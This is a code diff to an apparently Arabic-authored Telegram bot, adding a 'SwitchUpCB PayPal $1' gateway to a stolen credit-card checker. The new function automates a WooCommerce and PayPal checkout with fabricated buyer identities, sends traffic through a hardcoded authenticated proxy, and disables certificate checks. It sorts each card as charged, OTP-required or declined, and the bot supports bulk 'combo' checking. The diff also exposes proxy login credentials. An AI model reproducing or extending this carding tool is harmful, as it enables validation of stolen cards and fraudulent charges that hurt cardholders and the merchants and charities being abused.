@@ -1106,6 +1106,293 @@ class RealPayPalGateway:
         else:
             return {'status': 'ERROR', 'message': '❌ Gateway Error', 'code': 'ERROR'}
     
+    def check_card_switchupcb(self, ccx):
+        """بوابة SwitchUpCB - PayPal Real API"""
+        try:
+            import urllib3
+            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+            
+            ccx = ccx.strip()
+            parts = ccx.split("|")
+            if len(parts) < 4:
+                return {'status': 'ERROR', 'message': '❌ Invalid Format', 'code': 'ERROR'}, None
+            
+            n = parts[0]
+            mm = parts[1]
+            yy = parts[2]
+            cvc = parts[3]
+            
+            if "20" in yy:
+                yy = yy.split("20")[1] if len(yy) > 2 else yy
+            
+            user = self.get_random_user_agent()
+            r = requests.session()
+            
+            # إعداد البروكسي
+            proxy = {
+                "http": "http://llewellynashleybowen:rNXaRJfNPN233zw@136.179.19.164:3128",
+                "https": "http://llewellynashleybowen:rNXaRJfNPN233zw@136.179.19.164:3128"
+            }
+            r.proxies.update(proxy)
+            
+            # توليد بيانات عشوائية
+            first_names = ["Ahmed", "Mohamed", "Sarah", "Omar", "Layla", "Youssef", "Nour", "Hannah"]
+            last_names = ["Smith", "Johnson", "Williams", "Brown", "Garcia", "Martinez"]
+            cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix"]
+            states = ["NY", "CA", "IL", "TX", "AZ"]
+            streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave"]
+            zip_codes = ["10001", "90001", "60601", "77001", "85001"]
+            
+            first_name = random.choice(first_names)
+            last_name = random.choice(last_names)
+            city = random.choice(cities)
+            state = states[cities.index(city)]
+            street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
+            zip_code = zip_codes[states.index(state)]
+            
+            acc = ''.join(random.choices(string.ascii_lowercase, k=20)) + str(random.randint(1000, 9999)) + "@gmail.com"
+            num = "303" + ''.join(random.choices(string.digits, k=7))
+            
+            user_info = {
+                'name': f"{first_name} {last_name}",
+                'email': acc,
+                'address': f"{street_address}, {city}, {state} {zip_code}"
+            }
+            
+            # الخطوة 1: إضافة المنتج للسلة
+            files = {
+                'wpc_name_your_price': (None, '1.00'),
+                'quantity': (None, '1'),
+                'add-to-cart': (None, '4744'),
+            }
+            
+            multipart_data = MultipartEncoder(fields=files)
+            headers = {
+                'authority': 'switchupcb.com',
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+                'accept-language': 'en-US,en;q=0.9',
+                'content-type': multipart_data.content_type,
+                'user-agent': user,
+            }
+            
+            response = r.post('https://switchupcb.com/shop/drive-me-so-crazy/', headers=headers, data=multipart_data, verify=False)
+            
+            # الخطوة 2: الحصول على صفحة الدفع
+            headers = {
+                'authority': 'switchupcb.com',
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+                'accept-language': 'en-US,en;q=0.9',
+                'referer': 'https://switchupcb.com/cart/',
+                'user-agent': user,
+            }
+            
+            response = r.get('https://switchupcb.com/checkout/', cookies=r.cookies, headers=headers, verify=False)
+            
+            # استخراج الـ nonces
+            try:
+                sec = re.search(r'update_order_review_nonce":"(.*?)"', response.text).group(1)
+                nonce = re.search(r'save_checkout_form.*?nonce":"(.*?)"', response.text).group(1)
+                check = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response.text).group(1)
+                create = re.search(r'create_order.*?nonce":"(.*?)"', response.text).group(1)
+            except:
+                return {'status': 'ERROR', 'message': '❌ Failed to get tokens', 'code': 'ERROR'}, user_info
+            
+            # الخطوة 3: حفظ نموذج الدفع
+            headers = {
+                'authority': 'switchupcb.com',
+                'accept': '*/*',
+                'accept-language': 'en-US,en;q=0.9',
+                'content-type': 'application/json',
+                'origin': 'https://switchupcb.com',
+                'referer': 'https://switchupcb.com/checkout/',
+                'user-agent': user,
+            }
+            
+            form_encoded = f'billing_first_name={first_name}&billing_last_name={last_name}&billing_country=US&billing_address_1={street_address}&billing_city={city}&billing_state={state}&billing_postcode={zip_code}&billing_phone={num}&billing_email={acc}&payment_method=ppcp-gateway&woocommerce-process-checkout-nonce={check}&ppcp-funding-source=card'
+            
+            json_data = {
+                'nonce': nonce,
+                'form_encoded': form_encoded,
+            }
+            
+            response = r.post('https://switchupcb.com/?wc-ajax=ppc-save-checkout-form', cookies=r.cookies, headers=headers, json=json_data, verify=False)
+            
+            # الخطوة 4: إنشاء الطلب
+            json_data = {
+                'nonce': create,
+                'payer': None,
+                'bn_code': 'Woo_PPCP',
+                'context': 'checkout',
+                'order_id': '0',
+                'payment_method': 'ppcp-gateway',
+                'funding_source': 'card',
+                'form_encoded': form_encoded,
+                'createaccount': False,
+                'save_payment_method': False,
+            }
+            
+            response = r.post('https://switchupcb.com/?wc-ajax=ppc-create-order', cookies=r.cookies, headers=headers, json=json_data, verify=False)
+            
+            try:
+                order_id = response.json()['data']['id']
+                pcp = response.json()['data']['custom_id']
+            except:
+                return {'status': 'ERROR', 'message': '❌ Failed to create order', 'code': 'ERROR'}, user_info
+            
+            # الخطوة 5: الحصول على صفحة بطاقة PayPal
+            lol1 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
+            lol2 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
+            lol3 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=11))
+            
+            session_id = f'uid_{lol1}_{lol3}'
+            button_session_id = f'uid_{lol2}_{lol3}'
+            
+            headers = {
+                'authority': 'www.paypal.com',
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+                'accept-language': 'en-US,en;q=0.9',
+                'user-agent': user,
+            }
+            
+            params = {
+                'sessionID': session_id,
+                'buttonSessionID': button_session_id,
+                'locale.x': 'en_US',
+                'commit': 'true',
+                'env': 'production',
+                'token': order_id,
+            }
+            
+            response = r.get('https://www.paypal.com/smart/card-fields', params=params, headers=headers, verify=False)
+            
+            # الخطوة 6: إرسال بيانات البطاقة عبر GraphQL
+            headers = {
+                'authority': 'www.paypal.com',
+                'accept': '*/*',
+                'accept-language': 'en-US,en;q=0.9',
+                'content-type': 'application/json',
+                'origin': 'https://www.paypal.com',
+                'user-agent': user,
+                'x-app-name': 'standardcardfields',
+                'x-country': 'US',
+            }
+            
+            json_data = {
+                'query': '''
+                mutation payWithCard(
+                    $token: String!
+                    $card: CardInput!
+                    $phoneNumber: String
+                    $firstName: String
+                    $lastName: String
+                    $shippingAddress: AddressInput
+                    $billingAddress: AddressInput
+                    $email: String
+                    $currencyConversionType: CheckoutCurrencyConversionType
+                    $installmentTerm: Int
+                ) {
+                    approveGuestPaymentWithCreditCard(
+                        token: $token
+                        card: $card
+                        phoneNumber: $phoneNumber
+                        firstName: $firstName
+                        lastName: $lastName
+                        email: $email
+                        shippingAddress: $shippingAddress
+                        billingAddress: $billingAddress
+                        currencyConversionType: $currencyConversionType
+                        installmentTerm: $installmentTerm
+                    ) {
+                        flags {
+                            is3DSecureRequired
+                        }
+                        cart {
+                            intent
+                            cartId
+                            buyer {
+                                userId
+                                auth {
+                                    accessToken
+                                }
+                            }
+                            returnUrl {
+                                href
+                            }
+                        }
+                        paymentContingencies {
+                            threeDomainSecure {
+                                status
+                                method
+                                redirectUrl {
+                                    href
+                                }
+                                parameter
+                            }
+                        }
+                    }
+                }
+                ''',
+                'variables': {
+                    'token': order_id,
+                    'card': {
+                        'cardNumber': n,
+                        'expirationDate': mm + '/20' + yy,
+                        'postalCode': zip_code,
+                        'securityCode': cvc,
+                    },
+                    'firstName': first_name,
+                    'lastName': last_name,
+                    'billingAddress': {
+                        'givenName': first_name,
+                        'familyName': last_name,
+                        'line1': street_address,
+                        'line2': None,
+                        'city': city,
+                        'state': state,
+                        'postalCode': zip_code,
+                        'country': 'US',
+                    },
+                    'email': acc,
+                    'currencyConversionType': 'PAYPAL',
+                },
+                'operationName': None,
+            }
+            
+            response = requests.post(
+                'https://www.paypal.com/graphql?fetch_credit_form_submit',
+                headers=headers,
+                json=json_data,
+                proxies=proxy,
+                verify=False
+            )
+            
+            last = response.text
+            
+            # تحليل النتيجة
+            if ('ADD_SHIPPING_ERROR' in last or
+                'NEED_CREDIT_CARD' in last or
+                '"status": "succeeded"' in last or
+                'Thank You For Donation.' in last or
+                'Your payment has already been processed' in last or
+                'Success ' in last or
+                '"type":"one-time"' in last or
+                '/donations/thank_you?donation_number=' in last):
+                return {'status': 'CHARGED', 'message': '✅ Charged $1.00', 'code': 'APPROVED'}, user_info
+            elif 'is3DSecureRequired' in last:
+                return {'status': 'OTP', 'message': '⚠️ 3D Secure/OTP Required', 'code': 'APPROVED'}, user_info
+            elif 'OAS_VALIDATION_ERROR' in last or 'INVALID_BILLING_ADDRESS' in last:
+                return {'status': 'INSUFFICIENT_FUNDS', 'message': '❌ Insufficient Funds', 'code': 'DECLINED'}, user_info
+            else:
+                try:
+                    message = response.json()['errors'][0]['message']
+                    code = response.json()['errors'][0]['data'][0]['code']
+                    return {'status': code, 'message': f'❌ {message}', 'code': 'DECLINED'}, user_info
+                except:
+                    return {'status': 'DECLINED', 'message': '❌ Card Declined', 'code': 'DECLINED'}, user_info
+                    
+        except Exception as e:
+            return {'status': 'ERROR', 'message': f'❌ Gateway Error', 'code': 'ERROR'}, None
+    
     def _parse_shopify_response(self, text):
         """تحليل استجابة Shopify"""
         text = text.upper()
@@ -1182,6 +1469,8 @@ class RealPayPalGateway:
             result, user_info = self.check_card_rarediseases(card_line)
         elif gateway_type == "shopify":
             result, user_info = self.check_card_shopify(card_line)
+        elif gateway_type == "switchupcb":
+            result, user_info = self.check_card_switchupcb(card_line)
         else:  # crisiscafe
             result, user_info = self.check_card_crisiscafe(card_line)
         
@@ -1452,7 +1741,8 @@ async def select_gateway_handler(callback: CallbackQuery):
     keyboard.add(
         InlineKeyboardButton(text="💰 CrisisCafe PayPal $1", callback_data="gateway:crisiscafe"),
         InlineKeyboardButton(text="💰 RareDiseases PayPal $1", callback_data="gateway:rarediseases"),
-        InlineKeyboardButton(text="🛍️ Shopify Stripe $8.57", callback_data="gateway:shopify"),
+        InlineKeyboardButton(text="🛒️ Shopify Stripe $8.57", callback_data="gateway:shopify"),
+        InlineKeyboardButton(text="💳 SwitchUpCB PayPal $1", callback_data="gateway:switchupcb"),
         InlineKeyboardButton(text="🔙 Back", callback_data="back_main")
     )
     keyboard.adjust(1)
@@ -1486,6 +1776,8 @@ async def gateway_selected_handler(callback: CallbackQuery):
         gateway_name = "RareDiseases"
     elif gateway_type == "shopify":
         gateway_name = "Shopify"
+    elif gateway_type == "switchupcb":
+        gateway_name = "SwitchUpCB"
     else:
         gateway_name = "CrisisCafe"
     
@@ -1508,6 +1800,8 @@ async def single_check_handler(callback: CallbackQuery):
         gateway_name = "RareDiseases"
     elif gateway_type == "shopify":
         gateway_name = "Shopify"
+    elif gateway_type == "switchupcb":
+        gateway_name = "SwitchUpCB"
     else:
         gateway_name = "CrisisCafe"
     
@@ -1586,6 +1880,8 @@ async def combo_check_handler(callback: CallbackQuery):
         gateway_name = "RareDiseases"
     elif gateway_type == "shopify":
         gateway_name = "Shopify"
+    elif gateway_type == "switchupcb":
+        gateway_name = "SwitchUpCB"
     else:
         gateway_name = "CrisisCafe"
     
@@ -1710,6 +2006,8 @@ async def start_combo_processing(callback: CallbackQuery):
         gateway_name = "RareDiseases"
     elif gateway_type == "shopify":
         gateway_name = "Shopify"
+    elif gateway_type == "switchupcb":
+        gateway_name = "SwitchUpCB"
     else:
         gateway_name = "CrisisCafe"
     
@@ -2019,3 +2317,4 @@ if __name__ == "__main__":
     
     # تشغيل البوت
     asyncio.run(main())
+
